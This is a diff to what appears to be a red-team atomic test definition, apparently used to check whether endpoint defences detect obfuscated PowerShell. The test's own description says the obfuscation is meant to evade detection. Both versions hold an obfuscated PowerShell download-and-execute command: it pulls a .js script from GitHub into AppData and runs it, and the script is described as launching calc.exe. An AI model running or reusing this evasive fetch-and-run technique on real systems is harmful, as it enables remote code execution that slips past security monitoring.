@@ -70,18 +70,18 @@ atomic_tests:
 -   name: Execute Obfuscated Powershell Command
     auto_generated_guid:
     description: |
-        Starts the process powershell.exe with obfuscated arguments, which utilizes  escapes (`), empty quotes (""), and string slicing (',' and '+') to evade detection. Upon successful execution, PowerShell will download a .js script from Cyborg's Github and execute it, which will launch calc.exe.
+        Starts the process powershell.exe with obfuscated arguments, which utilizes  escapes (`), empty quotes (""), and string formatting (-f) to evade detection. Upon successful execution, PowerShell will download a .js script from Cyborg's Github to the AppData folder and execute it, which will launch calc.exe.
     supported_platforms:
     -   windows
     input_arguments:
-        cmd_command:
-            description: cmd.exe command to execute
+        powershell_cmd:
+            description: Powershell command to execute
             type: String
             default: |
-                "powershell.exe -command "-nopr -Exec Bypass (NewObject ','S','ys','te','m."""``N```e``t"""."""W`','`e','','`B`','','','c`l`','I`e```N``t""")."""`d`O`W`','','','n`L`o`A`D`s``tr`I`ng"""(('h'+'t'+("{0}{1}" -f'tps','://')+("{2}{0}{1}" -f'aw.g','ithu','r')+'bus'+'e'+("{0}{1}" -f'rcont','e')+'n'+("{0}{1}{2}{3}" -f 't','.co','m/Cy','bo')+'r'+("{1}{2}{0}" -f 'urit','gSe','c')+("{1}{2}{0}"-f 'o','y/c','yb')+("{0}{1}" -f'rg-a','t')+'o'+'mic'+("{0}{1}" -f '-r','ed-')+'t'+'ea'+'m'+("{1}{0}" -f'mas','/')+("{1}{0}{2}"-f'er/a','t','tomic')+("{1}{0}" -f 'A0','s/T')+'003'+'/'+'ca'+'l'+'c.'+'js'), $env:APPDATA + ((("{3}{1}{2}{0}"-f 's','0}calc.','j','{'))  -F  [ChaR]92)); Start-Process $env:APPDATA'\calc.js'""
+                (NEw-Ob`j`E`ct System.""""Net"""".""""WebClient"""").\"D`ow`Nl`oa`D`F`iLE\"(((\"{1}{0}{2}\" -f 'ps:','htt','/')+'/'+'r'+'a'+(\"{0}{1}\" -f'w.githu','b')+'u'+'se'+(\"{0}{1}\"-f'rc','on')+'te'+(\"{1}{0}\" -f 'c','nt.')+'om/'+(\"{0}{1}\" -f'Cy','bo')+'rgS'+'ec'+(\"{1}{0}\"-f 't','uri')+(\"{1}{0}\"-f 'ato','y/')+(\"{0}{1}\" -f'mic-re','d-t')+(\"{0}{1}\" -f 'eam','/')+(\"{2}{0}{1}\"-f 'y','borg','C')+(\"{3}{0}{2}{1}\"-f 'omics/T','9.','105','/at')+'0'+(\"{3}{0}{1}{2}\"-f '/cal','c.j','s','01')),$env:APPDATA +(('9'+'Cpc'+(\"{1}{0}\" -f's','alc.j'))  -rEPLACE([cHAR]57+[cHAR]67+[cHAR]112),[cHAR]92)); sTAr`T-`Pro`ceSs ($env:APPDATA + (('{0'+'}calc.js')-f[CHAR]92))
     executor:
         command: |
-            Start-Process cmd.exe -ArgumentList "#{cmd_command}"
+            cMD  /C PowerShELl -NoPR  #{powershell_cmd}
         name: powershell
         elevation_required: false
 
